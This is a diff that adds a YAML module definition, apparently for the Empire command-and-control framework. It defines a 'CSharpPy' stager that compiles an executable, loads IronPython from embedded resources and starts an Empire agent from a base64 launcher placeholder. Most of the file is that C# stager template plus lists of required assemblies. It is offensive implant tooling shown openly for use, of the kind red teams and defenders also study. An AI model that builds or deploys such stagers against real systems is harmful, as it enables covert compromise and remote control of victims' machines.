@@ -1,0 +1,107 @@
+- Name: CSharpPy
+  Aliases: []
+  Description: Generate a IronPython C# solution with embedded stager code that compiles to an exe
+  Author:
+      Name: Cx01N
+      Handle: Cx01N
+      Link: https://twitter.com/_Cx01N
+  Help:
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net40
+  Code: |
+    using System;
+    using System.IO.Compression;
+    using System.IO;
+    using System.Text;
+    using System.Collections;
+    using System.Reflection;
+    using CSharpPy;
+
+    class Program
+    {
+        public static void Main()
+        {
+            AppDomain.CurrentDomain.AssemblyResolve += (sender, args) =>
+                        {
+                            String resourceName = new AssemblyName(args.Name).Name + ".dll";
+                            using (var stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName))
+                            {
+                                Byte[] assemblyData = new Byte[stream.Length];
+                                stream.Read(assemblyData, 0, assemblyData.Length);
+                                return Assembly.Load(assemblyData);
+                            }
+                        };
+            string PyDirectory = @"{{ REPLACE_DIRECTORY }}";
+            string B64PyCode = "{{ REPLACE_LAUNCHER }}";
+            Empire.Agent(B64PyCode, PyDirectory);
+        }
+    }
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options: []
+  ReferenceSourceLibraries:
+  - Name: CSharpPy
+    Description: IronPython Empire Agent Library.
+    Location: CSharpPy\
+    Language: CSharp
+    CompatibleDotNetVersions:
+    - Net40
+    ReferenceAssemblies:
+      - Name: System.dll
+        Location: net40\System.dll
+        DotNetVersion: Net40
+      - Name: mscorlib.dll
+        Location: net40\mscorlib.dll
+        DotNetVersion: Net40
+      - Name: System.Core.dll
+        Location: net40\System.Core.dll
+        DotNetVersion: Net40
+      - Name: IronPython.dll
+        Location: net40\IronPython.dll
+        DotNetVersion: Net40
+      - Name: IronPython.SQLite.dll
+        Location: net40\IronPython.SQLite.dll
+        DotNetVersion: Net40
+      - Name: IronPython.Wpf.dll
+        Location: net40\IronPython.Wpf.dll
+        DotNetVersion: Net40
+      - Name: IronPython.Modules.dll
+        Location: net40\IronPython.Modules.dll
+        DotNetVersion: Net40
+      - Name: Microsoft.Dynamic.dll
+        Location: net40\Microsoft.Dynamic.dll
+        DotNetVersion: Net40
+      - Name: Microsoft.Scripting.dll
+        Location: net40\Microsoft.Scripting.dll
+        DotNetVersion: Net40
+      - Name: Microsoft.Scripting.Metadata.dll
+        Location: net40\Microsoft.Scripting.Metadata.dll
+        DotNetVersion: Net40
+      - Name: System.Runtime.CompilerServices.Unsafe.dll
+        Location: net40\System.Runtime.CompilerServices.Unsafe.dll
+        DotNetVersion: Net40
+    EmbeddedResources:
+      - Name: System.Runtime.CompilerServices.Unsafe.dll
+        Location: System.Runtime.CompilerServices.Unsafe.dll
+      - Name: System.Memory.dll
+        Location: System.Memory.dll
+      - Name: System.Buffers.dll
+        Location: System.Buffers.dll
+      - Name: IronPython.dll
+        Location: IronPython.dll
+      - Name: IronPython.Modules.dll
+        Location: IronPython.Modules.dll
+      - Name: IronPython.SQLite.dll
+        Location: IronPython.SQLite.dll
+      - Name: IronPython.Wpf.dll
+        Location: IronPython.Wpf.dll
+      - Name: Microsoft.Scripting.dll
+        Location: Microsoft.Scripting.dll
+      - Name: Microsoft.Scripting.Metadata.dll
+        Location: Microsoft.Scripting.Metadata.dll
+      - Name: Microsoft.Dynamic.dll
+        Location: Microsoft.Dynamic.dll
+  ReferenceAssemblies: []
+  EmbeddedResources: []
